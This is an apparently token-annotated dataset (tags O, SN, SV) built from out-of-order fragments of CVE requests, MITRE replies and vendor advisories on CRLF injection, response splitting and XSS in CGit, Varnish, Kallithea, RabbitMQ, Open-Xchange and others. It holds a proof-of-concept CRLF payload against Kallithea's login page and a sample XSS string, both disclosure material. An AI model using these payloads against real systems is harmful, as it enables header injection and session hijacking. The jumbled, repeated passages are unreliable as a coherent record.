to O
a O
buffer O
overflow O
. O

A O
malicious O
user O
could O
provide O
a O
string O
like O
: O
< O
script O
> O
xss O
< O
/script O
This O
has O
been O
fixed O
by O
removing O
support O
for O
the O
mimetype O
query O
string O
parameter O
: O
And O
then O
restricting O
to O
only O
generic O
mimetypes O
: O
And O
finally O
, O
just O
in O
case O
, O
setting O
the O
IE O
anti-sniffing O
header O
as O
well O
as O
a O
restrictive O
CSP O
header O
: O
2 O
. O

However O
, O
we O
typically O
don O
t O
want O
to O
have O
a O
CVE O
for O
a O
design O
change O
that O
probably O
breaks O
a O
number O
of O
existing O
installations O
unless O
reconfigured O
. O

This O
has O
been O
fixed O
by O
properly O
escaping O
filenames O
in O
headers O
: O
Use O
CVE-2016-1900 O
. O

And O
then O
restricting O
to O
only O
generic O
mimetypes O
: O
And O
finally O
, O
just O
in O
case O
, O
setting O
the O
IE O
anti-sniffing O
header O
as O
well O
as O
a O
restrictive O
CSP O
header O
: O
There O
is O
no O
CVE O
ID O
associated O
with O
either O
of O
these O
other O
changes O
, O
which O
seem O
to O
be O
for O
defense-in-depth O
purposes O
. O

Subject O
: O
Re O
: O
CVE O
Request O
: O
CGit O
- O
Multiple O
vulnerabilities O
BEGIN O
PGP O
SIGNED O
MESSAGE O
Hash O
: O
SHA256 O
1 O
. O

Date O
: O
Thu O
, O
14 O
Jan O
2016 O
11:55:46 O
-0500 O
( O
EST O
) O
From O
: O
cve-assign O
@ O
... O
re.org O
To O
: O
Jason O
@ O
... O
c4.com O
Cc O
: O
cve-assign O
@ O
... O
re.org O
, O
oss-security O
@ O
... O
ts.openwall.com O
, O
krzysztof.kowalewski O
@ O
... O
t.pl O
, O
erik O
@ O
... O
ludesecurity.com O

There O
is O
no O
CVE O
ID O
associated O
with O
this O
report O
, O
which O
seems O
to O
be O
about O
adding O
new O
security-related O
functionality O
. O

A O
malicious O
user O
could O
provide O
a O
string O
like O
: O
< O
script O
> O
xss O
< O
/script O
This O
has O
been O
fixed O
by O
removing O
support O
for O
the O
mimetype O
query O
string O
parameter O
: O
Use O
CVE-2016-1899 O
. O

- O
CVE O
assignment O
team O
, O
MITRE O
CVE O
Numbering O
Authority O
M/S O
M300 O
202 O
Burlington O
Road O
, O
Bedford O
, O
MA O
01730 O
USA O
[ O
PGP O
key O
available O
through O
] O
BEGIN O
PGP O
SIGNATURE O
Version O
: O
GnuPG O
v1 O
iQIcBAEBCAAGBQJWl9JtAAoJEL54rhJi8gl5lQEP/RNIfyGohJ7Z/SHub/OW/Bl0 O
39LctMT9FcOTD6WBIvub4bWE6Q/c2FlWfDjeier2cO+pm3xJnXZEvGDMxZEI2wYI O
ErO9spu++XX6JDak0Il9fdxPTTzjSJj+c+8O8fKI3mJyUVxNhmWYUxIdG83or9zx O
ZUko+9LmXStUliIwG7FKGdqbP9gHvFI+ZLdfwtPomNJs9MEzJPipOEuSh6/Ia822 O
4rXxn9Jb+wCVWdIhsaGUkuM4wq2SZsMcpJ13ww4IOOnCErfDKbRrODXvt03MRwyE O
yE0R7aI0RoSzqzUAyiqJZZfgVgrPl1Ofx3n6mnbV3Y93Ypo8MparXUXf7+LDTT7I O
Q9M7CWc5YYOnRBg12XFaUmJY25UQRlc4PjVUpX6DZY2vyzuO8cj3k64Vi4wcQ/Nc O
OtyqNuKUJMPH77mVmMZHy7jfbtq/I20H34B57+jfBkCyLs50tQAP+8EAze0yEFF4 O
ZXv87eMrUNJJu/qOoZeJaf57PAzuFaoANtYBQ+p/hUfMwsm8iGoy6Ko0ZXO3ZW3k O
9kACdNt3QX0OfNVLws2r6qr+CFERrHMp+ha6JZbBFGAPNO4QP9ATzaixQzJ76nSU O
pPrqObQ6H58Mmq+ACRtBTNLVnccMNLsMDPgSWeLmlXZpe5DP/EPyQuSduC7gDkB O
8Td7FtAmzPUi1aORc6OK O
=F6i1 O
END O
PGP O
SIGNATURE O

We O
realize O
that O
other O
perspectives O
may O
have O
existed O
, O
especially O
because O
the O
attacker O
for O
both O
2 O
and O
3 O
is O
A O
user O
who O
has O
write O
access O
to O
the O
git O
repository O
. O

Additionally O
, O
while O
the O
redirect O
for O
the O
/about O
- O
/about O
page O
does O
not O
appear O
to O
be O
vulnerable O
due O
to O
mitigating O
conditions O
, O
the O
following O
commit O
was O
made O
to O
similarly O
harden O
potential O
injections O
here O
: O
There O
is O
no O
CVE O
ID O
associated O
with O
this O
additional O
issue O
. O

This O
has O
been O
fixed O
by O
this O
commit O
: O
Use O
CVE-2016-1901 O
. O

Also O
, O
it O
seems O
that O
another O
possibility O
may O
have O
been O
creation O
of O
a O
framework O
for O
segregating O
the O
user-uploaded O
HTML O
files O
into O
a O
different O
origin O
( O
admittedly O
this O
may O
not O
be O
worthwhile O
because O
running O
a O
cgit O
service O
with O
two O
domain O
names O
probably O
isn O
t O
what O
the O
ordinary O
cgit O
customer O
wants O
) O
. O

Subject O
: O
Re O
: O
CVE O
Request O
: O
CGit O
- O
Multiple O
vulnerabilities O

CRLF O
injection O
vulnerability O
in O
the O
on_req O
function O
in O
lib/handler/redirect.c O
in O
H2O SN
before SV
1.6.2 SV
and SV
1.7.x SV
before SV
1.7.0-beta3 SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
a O
crafted O
URI O
. O

Varnish SN
3.x SV
before SV
3.0.7 SV
, O
when O
used O
in O
certain O
stacked O
installations O
, O
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
a O
header O
line O
terminated O
by O
a O
( O
carriage O
return O
) O
character O
in O
conjunction O
with O
multiple O
Content-Length O
headers O
in O
an O
HTTP O
request O
. O

Stop O
recognizing O
a O
single O
CR O
( O
r O
) O
as O
a O
HTTP O
line O
separator O
. O

Subject O
: O
CVE O
request O
: O
Varnish SN
3 SV
before SV
3.0.7 SV
was O
vulnerable O
to O
HTTP O
Smuggling O
issues O
: O
Double O
Content O
Length O
and O
bad O
EOL O
Varnish O
4.x O
serie O
is O
not O
impacted O
. O

Changelog O
is O
: O
Requests O
with O
multiple O
Content-Length O
headers O
will O
now O
fail O
. O

This O
opened O
up O
a O
possible O
cache O
poisoning O
attack O
in O
stacked O
installations O
where O
sslterminator/varnish/backend O
had O
different O
CR O
handling O
. O

Combinations O
of O
theses O
two O
flaws O
in O
HTTP O
protocol O
handling O
allows O
for O
HTTP O
Response O
Splitting O
attacks O
when O
another O
actor O
in O
front O
of O
Varnish3 O
can O
transmit O
headers O
in O
this O
form O
( O
for O
example O
) O
: O
Dummy O
: O
header O
Content-Length O
: O
0 O
This O
is O
a O
one O
year O
old O
issue O
, O
on O
the O
old O
last O
release O
of O
this O
serie O
. O

Fixed O
in O
version O
3.0.7 O
in O
march O
2015 O
. O

But O
we O
still O
find O
some O
installations O
. O

A O
CVE O
would O
maybe O
help O
removal O
of O
3.x O
installations O
, O
or O
at O
least O
upgrades O
to O
3.0.7 O
. O

Date O
: O
Sat O
, O
16 O
Apr O
2016 O
10:07:03 O
+0200 O
From O
: O
R O
xc3 O
x83 O
xc2 O
xa9gis O
Leroy O
< O
regis.leroy O
@ O
... O
il.com O
To O
: O
oss-security O
@ O
... O
ts.openwall.com O

Subject O
: O
CVE O
request O
: O
Varnish SN
3 SV
before SV
3.0.7 SV
was O
vulnerable O
to O
HTTP O
Smuggling O
issues O
: O
Double O
Content O
Length O
and O
bad O
EOL O

Combinations O
of O
theses O
two O
flaws O
in O
HTTP O
protocol O
handling O
allows O
for O
HTTP O
Response O
Splitting O
attacks O
when O
another O
actor O
in O
front O
of O
Varnish3 O
can O
transmit O
headers O
in O
this O
form O
( O
for O
example O
) O
: O
Dummy O
: O
header O
Content-Length O
: O
0 O
Use O
CVE-2015-8852 O
. O

As O
far O
as O
we O
can O
tell O
, O
29870c8fe95e4e8a672f6f28c5fbe692bea09e9c O
is O
not O
independently O
exploitable O
and O
thus O
only O
a O
single O
ID O
is O
needed O
. O

Subject O
: O
Re O
: O
CVE O
request O
: O
Varnish SN
3 SV
before SV
3.0.7 SV
was O
vulnerable O
to O
HTTP O
Smuggling O
issues O
: O
Double O
Content O
Length O
and O
bad O
EOL O
BEGIN O
PGP O
SIGNED O
MESSAGE O
Hash O
: O
SHA256 O
Changelog O
is O
: O
Requests O
with O
multiple O
Content-Length O
headers O
will O
now O
fail O
. O

Date O
: O
Mon O
, O
18 O
Apr O
2016 O
12:01:31 O
-0400 O
( O
EDT O
) O
From O
: O
cve-assign O
@ O
... O
re.org O
To O
: O
regis.leroy O
@ O
... O
il.com O
Cc O
: O
cve-assign O
@ O
... O
re.org O
, O
oss-security O
@ O
... O
ts.openwall.com O

- O
CVE O
Assignment O
Team O
M/S O
M300 O
, O
202 O
Burlington O
Road O
, O
Bedford O
, O
MA O
01730 O
USA O
[ O
A O
PGP O
key O
is O
available O
for O
encrypted O
communications O
at O
] O
BEGIN O
PGP O
SIGNATURE O
Version O
: O
GnuPG O
v1 O
iQIcBAEBCAAGBQJXFQRTAAoJEHb/MwWLVhi2JWQP/1KyFQ29uDWigwCEnW1lY/CX O
cyYnYNbRpsoXBIpkA6nCXJxD4IT3d5QXiWmtpelZy7A0CkdWLFa5dRJCC3wchn/J O
FE4xjsEFpvaiH5GJXwMpETfQ3dPxhXqpFCk8CFt9grirRZNSwziClSc3QF4nZXL5 O
XfQMKWkgPE5e1kKbLGncqRyRsT9SY8PURfD6f1BPTZ9AhOUKrSXAIVrANRKhkbSV O
L5TIYxKKegFX/dn+c7lu+ur9TkvdOKHJ4NUPJE2G4UkbajPM9+YhYGJXa7z45+6D O
WJrPNUesSvxbaXQcmhxpbwWmcrnHCec7ONnp8GU047PqD/f2cRiudH0/qjmA3Lla O
t3tZwcRbCMIGEMzMDV82k6H+lh8KUxD+ZAyLpaWa/M+A8qCM7rTt06N0Sk+2bOD5 O
LShXWIuWsfXqLhUmwI5irXdwoCPO8qqjawLpPSDxRSTmF0FJp5o3dMAZ9Bod0a4r O
wrC9eoClGb9yYy6Rp6Cu2S3SOLTgIrfNcWqiYKu4TzrlkrtuippLlrsmANeaFnVl O
j1E9hK2+UQI3+l77BufqIUyyOajksb8LMRfIpmH/YFfyXfP1SGcoXVdb8UcForxO O
Wu6muPmPTPrMpocn/sL5M6eGgcqFJ+X99BVzMSq4dn0V/Tn+EWR5kdjGxozkRn0O O
Y+bA2XlK2SlcdBVOOEi6 O
=Y81M O
END O
PGP O
SIGNATURE O

Subject O
: O
Re O
: O
CVE O
request O
: O
Varnish SN
3 SV
before SV
3.0.7 SV
was O
vulnerable O
to O
HTTP O
Smuggling O
issues O
: O
Double O
Content O
Length O
and O
bad O
EOL O

CRLF O
injection O
vulnerability O
in O
Kallithea SN
before SV
0.3 SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
the O
came_from O
parameter O
to O
_admin/login O
. O

< O
/body O
< O
/html O

xef O
xbb O
xbf O
Kallithea O
0.2.9 O
( O
came_from O
) O
HTTP O
Response O
Splitting O
Vulnerability O

Summary O
: O
Kallithea O
, O
a O
member O
project O
of O
Software O
Freedom O
Conservancy O
, O
is O
a O
GPLv3 O
d O
, O
Free O
Software O
source O
code O
management O
system O
that O
supports O
two O
leading O
version O
control O
systems O
, O
Mercurial O
and O
Git O
, O
and O
has O
a O
web O
interface O
that O
is O
easy O
to O
use O
for O
users O
and O
admins O
. O

Tested O
on O
: O
Kali O
Python O
Vulnerability O
discovered O
by O
Gjoko O
LiquidWorm O
Krstic O
@ O
zeroscience O
Advisory O
ID O
: O
ZSL-2015-5267 O
Advisory O
URL O
: O
Advisory O
: O
ID O
: O
2015-5285 O
CVE O
URL O
: O
/_admin/login O
came_from=d47b5 O
% O
0d O
% O
0aX-Forwarded-Host O
% O
3a O
% O
20 O
HTTP/1.1 O
Host O
: O
192.168.0.28:8080 O
Content-Length O
: O
0 O
Cache-Control O
: O
max-age=0 O
Accept O
: O
text/html O
, O
application/xhtml+xml O
, O
application/xml O
; O
q=0.9 O
, O
image/webp O
, O
; O
q=0.8 O
Origin O
: O
1 O
User-Agent O
: O
Mozilla/5.0 O
( O
Windows O
NT O
6.1 O
; O
WOW64 O
) O
AppleWebKit/537.36 O
( O
KHTML O
, O
like O
Gecko O
) O
Chrome/45.0.2454.93 O
Safari/537.36 O
Content-Type O
: O
application/x-www-form-urlencoded O
Referer O
: O
gzip O
, O
deflate O
Accept-Language O
: O
en-US O
, O
en O
; O
q=0.8 O
Cookie O
: O
kallithea=3090b35b3e37ba350d71b62c240c50bf87932f0d7e6b1a600cba4e0e890b7e29e253b438 O
HTTP/1.1 O
302 O
Found O
Cache-Control O
: O
no-cache O
Content-Length O
: O
411 O
Content-Type O
: O
text/html O
; O
charset=UTF-8 O
Date O
: O
Mon O
, O
21 O
Sep O
2015 O
13:58:05 O
GMT O
Location O
: O
no-cache O
Server O
: O
waitress O
< O
html O
< O
head O
< O
title O
> O
302 O
Found O
< O
/title O
< O
/head O
< O
body O
< O
h1 O
> O
302 O
Found O
< O
/h1 O
The O
resource O
was O
found O
at O
< O
a O
href= O
should O
be O
redirected O
automatically O
. O

Vendor O
: O
Kallithea SN
Product O
web O
page O
: O
affected O
: O
0.2.9 SV
and SV
0.2.2 SV

Desc O
: O
Kallithea O
suffers O
from O
a O
HTTP O
header O
injection O
( O
response O
splitting O
) O
vulnerability O
because O
it O
fails O
to O
properly O
sanitize O
user O
input O
before O
using O
it O
as O
an O
HTTP O
header O
value O
via O
the O
GET O
came_from O
parameter O
in O
the O
login O
instance O
. O

This O
type O
of O
attack O
not O
only O
allows O
a O
malicious O
user O
to O
control O
the O
remaining O
headers O
and O
body O
of O
the O
response O
the O
application O
intends O
to O
send O
, O
but O
also O
allow O
them O
to O
create O
additional O
responses O
entirely O
under O
their O
control O
. O

Kallithea SN
0.2.9 SV
- O
came_from O
HTTP O
Response O
Splitting O

CRLF O
injection O
vulnerability O
in O
the O
Ceph O
Object O
Gateway O
( O
aka O
radosgw O
or O
RGW O
) O
in O
Ceph SN
before SV
0.94.4 SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
a O
crafted O
bucket O
name O
. O

Django SN
before SV
1.4.21 SV
, O
1.5.x SV
through SV
1.6.x SV
, O
1.7.x SV
before SV
1.7.9 SV
, O
and SV
1.8.x SV
before SV
1.8.3 SV
uses O
an O
incorrect O
regular O
expression O
, O
which O
allows O
remote O
attackers O
to O
inject O
arbitrary O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
a O
newline O
character O
in O
an O
( O
1 O
) O
email O
message O
to O
the O
EmailValidator O
, O
a O
( O
2 O
) O
URL O
to O
the O
URLValidator O
, O
or O
unspecified O
vectors O
to O
the O
( O
3 O
) O
validate_ipv4_address O
or O
( O
4 O
) O
validate_slug O
validator O
. O

CRLF O
injection O
vulnerability O
in O
IBM SN
WebSphere SN
eXtreme SN
Scale SN
7.1.0 SV
before SV
7.1.0.3 SV
and SV
7.1.1 SV
before SV
7.1.1.1 SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
a O
crafted O
URL O
. O

CRLF O
injection O
vulnerability O
in O
IBM SN
WebSphere SN
Application SN
Server SN
( O
WAS SN
) O
6.1 SV
through SV
6.1.0.47 SV
, O
7.0 SV
before SV
7.0.0.39 SV
, O
8.0 SV
before SV
8.0.0.12 SV
, O
and SV
8.5 SV
before SV
8.5.5.8 SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
a O
crafted O
URL O
. O

CRLF O
injection O
vulnerability O
in O
the O
HTTP O
Header O
Handler O
in O
Digital O
Broadband O
Delivery O
System O
in O
Cisco O
Headend O
System O
Release O
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
, O
and O
conduct O
HTTP O
response O
splitting O
attacks O
or O
cross-site O
scripting O
( O
XSS O
) O
attacks O
, O
via O
a O
crafted O
request O
, O
aka O
Bug O
ID O
CSCur25580 O
. O

CRLF O
injection O
vulnerability O
in O
IBM SN
WebSphere SN
Commerce SN
6.0 SV
through SV
6.0.0.11 SV
and SV
7.0 SV
before SV
7.0.0.8 SV
Cumulative SV
iFix SV
2 SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
a O
crafted O
URL O
. O

CRLF O
injection O
vulnerability O
in O
the O
management O
in O
RabbitMQ SN
2.1.0 SV
through SV
3.4.x SV
before SV
3.4.1 SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
the O
download O
parameter O
to O
api/definitions O
. O

Thanks O
, O
Marc O
. O

Marc O
Deslauriers O
Ubuntu O
Security O
Engineer O
| O
Canonical O
Ltd. O
| O

Fixed O
by O
: O
Could O
CVEs O
please O
be O
assigned O
to O
these O
issue O

This O
was O
fixed O
by O
ensuring O
all O
URLs O
below O
/api O
only O
ever O
return O
responses O
with O
a O
content O
type O
of O
application/json O
, O
even O
in O
the O
case O
of O
an O
internal O
server O
error O
. O

This O
was O
fixed O
by O
stripping O
out O
CR/LF O
from O
the O
download O
query O
string O
parameter O
. O

Date O
: O
Wed O
, O
21 O
Jan O
2015 O
13:47:28 O
-0500 O
From O
: O
Marc O
Deslauriers O
< O
marc.deslauriers O
@ O
... O
onical.com O
To O
: O
oss-security O
@ O
... O
ts.openwall.com O

Bug O
26433 O
allowed O
an O
attacker O
to O
specify O
a O
URL O
to O
/api/definitions O
which O
would O
cause O
an O
arbitrary O
additional O
header O
to O
be O
returned O
. O

Subject O
: O
CVE O
Request O
: O
XSS O
and O
response-splitting O
bugs O
in O
rabbitmq O
management O
plugin O
Hello O
, O
The O
following O
issues O
were O
fixed O
in O
RabbitMQ O
3.4.1 O
: O
( O
as O
described O
in O
) O
26437 O
prevent O
/api O
from O
returning O
text/html O
error O
messages O
which O
could O
act O
as O
an O
XSS O
vector O
( O
since O
2.1.0 O
) O
26433 O
fix O
response-splitting O
vulnerability O
in O
/api/downloads O
( O
since O
2.1.0 O
) O
Bug O
26437 O
allowed O
an O
attacker O
to O
create O
a O
URL O
to O
/api/ O
... O
which O
would O
provoke O
an O
internal O
server O
error O
, O
resulting O
in O
the O
server O
returning O
an O
html O
page O
with O
text O
from O
the O
URL O
embedded O
and O
not O
escaped O
. O

Subject O
: O
CVE O
Request O
: O
XSS O
and O
response-splitting O
bugs O
in O
rabbitmq O
management O
plugin O

CRLF O
injection O
vulnerability O
in O
IBM SN
Tivoli SN
Integrated SN
Portal SN
( O
TIP SN
) O
2.2.x SV
allows O
remote O
authenticated O
users O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
unspecified O
vectors O
. O

CRLF O
injection O
vulnerability O
in O
IBM SN
Maximo SN
Asset SN
Management SN
7.5 SV
through SV
7.5.0.6 SV
, O
and SV
7.5 SV
through SV
7.5.0.3 SV
and SV
7.5.1 SV
through SV
7.5.1.2 SV
for O
SmartCloud O
Control O
Desk O
, O
allows O
remote O
authenticated O
users O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
unspecified O
vectors O
. O

CRLF O
injection O
vulnerability O
in O
OXID SN
eShop SN
Professional SV
Edition SV
before SV
4.7.11 SV
and SV
4.8.x SV
before SV
4.8.4 SV
, O
Enterprise SV
Edition SV
before SV
5.0.11 SV
and SV
5.1.x SV
before SV
5.1.4 SV
, O
and SV
Community SV
Edition SV
before SV
4.7.11 SV
and SV
4.8.x SV
before SV
4.8.4 SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
unspecified O
vectors O
. O

CRLF O
injection O
vulnerability O
in O
goform/formWlSiteSurvey SN
on SN
the SN
Conceptronic SN
C54APM SN
access SN
point SN
with SN
runtime SN
code SN
1.26 SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
the O
submit-url O
parameter O
in O
a O
Refresh O
action O
. O

CRLF O
injection O
vulnerability O
in O
Open-Xchange SN
AppSuite SN
before SV
7.2.2 SV
, O
when O
using O
AJP O
in O
certain O
conditions O
, O
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
the O
ajax/defer O
servlet O
. O

This O
can O
lead O
to O
session O
hijacking O
or O
triggering O
unwanted O
actions O
via O
the O
web O
interface O
( O
sending O
mail O
, O
deleting O
data O
etc O
. O
) O

While O
the O
most O
commonly O
used O
MIME-types O
are O
covered O
( O
text/html O
) O
, O
some O
browsers O
also O
execute O
script O
code O
within O
files O
signalled O
with O
text/xml O
MIME-type O
. O

Risk O
: O
A O
user O
may O
be O
tricked O
to O
open O
a O
link O
pointing O
to O
a O
trusted O
URL O
. O

Vendor O
notification O
: O
2013-09-02 O
Solution O
date O
: O
2013-09-12 O
Public O
disclosure O
: O
2013-09-30 O
CVE O
reference O
: O
CVE-2013-5690 O
CVSSv2 O
: O
5.7 O
( O
AV O
: O
N/AC O
: O
L/Au O
: O
S/C O
: O
N/I O
: O
P/A O
: O
N/E O
: O
F/RL O
: O
U/RC O
: O
C/CDP O
: O
LM/TD O
: O
H/CR O
: O
ND/IR O
: O
ND/AR O
: O
ND O
) O
Vulnerability O
Details O
: O
File O
contents O
are O
sanitized O
to O
avoid O
script O
execution O
be O
rogue O
content O
. O

Vendor O
notification O
: O
2013-09-02 O
Solution O
date O
: O
2013-09-12 O
Public O
disclosure O
: O
2013-09-30 O
CVE O
reference O
: O
CVE-2013-5690 O
CVSSv2 O
: O
5.7 O
( O
AV O
: O
N/AC O
: O
L/Au O
: O
S/C O
: O
N/I O
: O
P/A O
: O
N/E O
: O
F/RL O
: O
U/RC O
: O
C/CDP O
: O
LM/TD O
: O
H/CR O
: O
ND/IR O
: O
ND/AR O
: O
ND O
) O
Vulnerability O
Details O
: O
Entering O
script O
code O
to O
an O
appointments O
Status O
comment O
field O
is O
possible O
and O
not O
sanitized O
. O

However O
, O
by O
crafting O
malicious O
parameters O
to O
this O
request O
, O
it O
possible O
to O
inject O
HTTP O
headers O
. O

These O
may O
be O
used O
to O
redirect O
the O
user O
to O
an O
unexpected O
website O
or O
offer O
unsolicited O
content O
in O
the O
context O
of O
a O
trusted O
domain O
. O

For O
performance O
reasons O
, O
the O
sanitation O
takes O
place O
for O
requests O
where O
the O
MIME O
type O
indicates O
that O
the O
content O
will O
be O
displayed/executed O
within O
the O
browser O
context O
. O

Vulnerable O
component O
: O
backend O

Risk O
: O
Malicious O
script O
code O
can O
be O
executed O
within O
a O
users O
context O
. O

The O
script O
code O
is O
executed O
when O
printing O
the O
appointment O
. O

Vulnerable O
version O
: O
prior SV
to SV
7.2.2 SV

Product O
: O
Open-Xchange O
AppSuite O

Fixed O
by O

Confirmed O
Solution O
status O
: O

Internal O
reference O
: O
28635 O
( O
Bug O
ID O
) O
Vulnerability O
type O
: O
CWE-80 O
( O
Improper O
Neutralization O
of O
Script-Related O
HTML O
Tags O
in O
a O
Web O
Page O
) O

Fixed O
version O
: O
7.0.2-rev16 O
, O
7.2.2-rev20 O
Report O
confidence O
: O

Vendor O
notification O
: O
2013-08-27 O
Solution O
date O
: O
2013-09-12 O
Public O
disclosure O
: O
2013-09-30 O
CVE O
reference O
: O
CVE-2013-5690 O
CVSSv2 O
: O
5.7 O
( O
AV O
: O
N/AC O
: O
L/Au O
: O
S/C O
: O
N/I O
: O
P/A O
: O
N/E O
: O
F/RL O
: O
U/RC O
: O
C/CDP O
: O
LM/TD O
: O
H/CR O
: O
ND/IR O
: O
ND/AR O
: O
ND O
) O
Vulnerability O
Details O
: O
It O
possible O
to O
use O
the O
/ajax/defer O
servlet O
to O
create O
malicious O
HTTP O
responses O
by O
injecting O
crafted O
HTTP O
headers O
. O

This O
issue O
occurs O
when O
using O
AJP O
as O
a O
backend O
connector O
to O
OX O
while O
HTTP O
based O
connectors O
return O
an O
error O
message O
for O
that O
request O
. O

Vendor O
: O
Open-Xchange O
GmbH O
Internal O
reference O
: O
28642 O
( O
Bug O
ID O
) O
Vulnerability O
type O
: O
CWE-80 O
( O
Improper O
Neutralization O
of O
Script-Related O
HTML O
Tags O
in O
a O
Web O
Page O
) O

Solution O
: O
Users O
should O
update O
to O
the O
latest O
available O
patch O
releases O
. O

Open-Xchange O
Security O
Advisory O
2013-09-30 O

CRLF O
injection O
vulnerability O
in O
IBM SN
WebSphere SN
Portal SN
6.1.0.x SV
before SV
6.1.0.3 SV
CF26 SV
, O
6.1.5.x SV
before SV
6.1.5 SV
CF26 SV
, O
7.0.0.x SV
before SV
7.0.0.2 SV
CF21 SV
, O
and SV
8.0.0.x SV
through SV
8.0.0.1 SV
CF5 SV
, O
when O
home O
substitution O
( O
aka O
uri.home.substitution O
) O
is O
enabled O
, O
allows O
remote O
authenticated O
users O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
unspecified O
vectors O
. O

CRLF O
injection O
vulnerability O
in O
spacewalk-java SN
before SV
2.1.148-1 SV
and O
Red SN
Hat SN
Network SN
( O
RHN SN
) O
Satellite SN
5.6 SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
, O
and O
conduct O
HTTP O
response O
splitting O
attacks O
and O
cross-site O
scripting O
( O
XSS O
) O
attacks O
, O
via O
the O
return_url O
parameter O
. O

Multiple O
CRLF O
injection O
vulnerabilities O
in O
Open-Xchange SN
Server SN
before SV
6.20.7 SV
rev14 SV
, O
6.22.0 SV
before SV
rev13 SV
, O
and SV
6.22.1 SV
before SV
rev14 SV
allow O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
a O
crafted O
parameter O
, O
as O
demonstrated O
by O
( O
1 O
) O
the O
location O
parameter O
to O
ajax/redirect O
or O
( O
2 O
) O
multiple O
infostore O
URIs O
. O

CRLF O
injection O
vulnerability O
in O
the O
HMI O
web O
in O
Siemens SN
WinCC SN
( O
TIA SN
Portal SN
) O
11 SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
a O
crafted O
URL O
. O

CRLF O
injection O
vulnerability O
in O
the O
cookie O
method O
( O
lib/Dancer/Cookie.pm O
) O
in O
Dancer SN
before SV
1.3114 SV
allows O
remote O
attackers O
to O
inject O
arbitrary O
HTTP O
headers O
and O
conduct O
HTTP O
response O
splitting O
attacks O
via O
a O
cookie O
name O
, O
a O
different O
vulnerability O
than O
CVE-2012-5526 O
. O

A O
remote O
attacker O
could O
use O
this O
flaw O
to O
inject O
arbitrary O
headers O
into O
responses O
from O
( O
Perl O
) O
applications O
, O
that O
use O
Dancer.pm O
. O

: O
The O
issue O
is O
different O
unrelated O
than O
similar O
recent O
CGI.pm O
, O
CVE-2012-5526 O
, O
flaw O
( O
the O
presence O
absence O
of O
the O
CGI.pm O
CVE-2012-5526 O
fix O
doesn O
t O
have O
impact O
on O
it O
) O
. O

Date O
: O
Mon O
, O
26 O
Nov O
2012 O
11:43:18 O
-0700 O
From O
: O
Kurt O
Seifried O
< O
kseifried O
@ O
... O
hat.com O
To O
: O
oss-security O
@ O
... O
ts.openwall.com O
CC O
: O
Jan O
Lieskovsky O
< O
jlieskov O
@ O
... O
hat.com O
> O
, O
Steven O
M. O
Christey O
< O
coley O
@ O
... O
us.mitre.org O
> O
, O
Sawyer O
X O
< O
xsawyerx O
@ O
... O
n.org O
> O
, O
Petr O
Pisar O
< O
ppisar O
@ O
... O
hat.com O

Thank O
you O
& O
& O
Regards O
, O
Jan. O
Jan O
iankko O
Lieskovsky O
Red O
Hat O
Security O
Response O
Team O
P.S O
. O

References O
Could O
you O
allocate O
a O
CVE O
id O
for O
this O

A O
different O
vulnerability O
than O
CVE-2012-5526 O
. O

- O
Kurt O
Seifried O
Red O
Hat O
Security O
Response O
Team O
( O
SRT O
) O
PGP O
: O
0x5E267993 O
A90B O
F995 O
7350 O
148F O
66BF O
7554 O
160D O
4553 O
5E26 O
7993 O
BEGIN O
PGP O
SIGNATURE O
Version O
: O
GnuPG O
v1.4.12 O
( O
GNU/Linux O
) O
iQIcBAEBAgAGBQJQs7hGAAoJEBYNRVNeJnmT0gsP/RE8jm9pBxcXxN47xB8K5Elp O
f9wl3D0qWOK/nBqL/OIyy6gJ/8+0Gm5y9QKYvanwMEss668PKkflgZ/Bffa9t2+4 O
1eya1Y+UX/+CN7UE9uNsiYPuRb1PlB6aPo/V9Mf+X+So+QvbrwDt8e+dVupK9XDW O
ZJDhP7tJGOR3Mfly+5IDSqJf7cg9WtRpfrPXiyGVTEHwvE6ocE2Qnc8WQ46ZCGLN O
lDdMMsawpieqO7ItF0co46k0KaU0Lhu5wS7CjU2h6GRRMI3+VDYiBuqsn4t+HwI8 O
wQUcd0LVidfSDFuFwHcf3Wt08SvPG6fiH9Kx/vwo5gvsi7L5lB2xxviEufuqwTpL O
V3rlGY1uI+KbHlI/sqZUKKuXLuuG76P6VrTb/Qoh1YoRfpbZrqSvvtBjn+RmIWe+ O
x6jucEBqWE9zivj1GsstCfbthVGHAxNmNYZC7JByUZDB9Eyrk3/2CLfM4BwV3EcA O
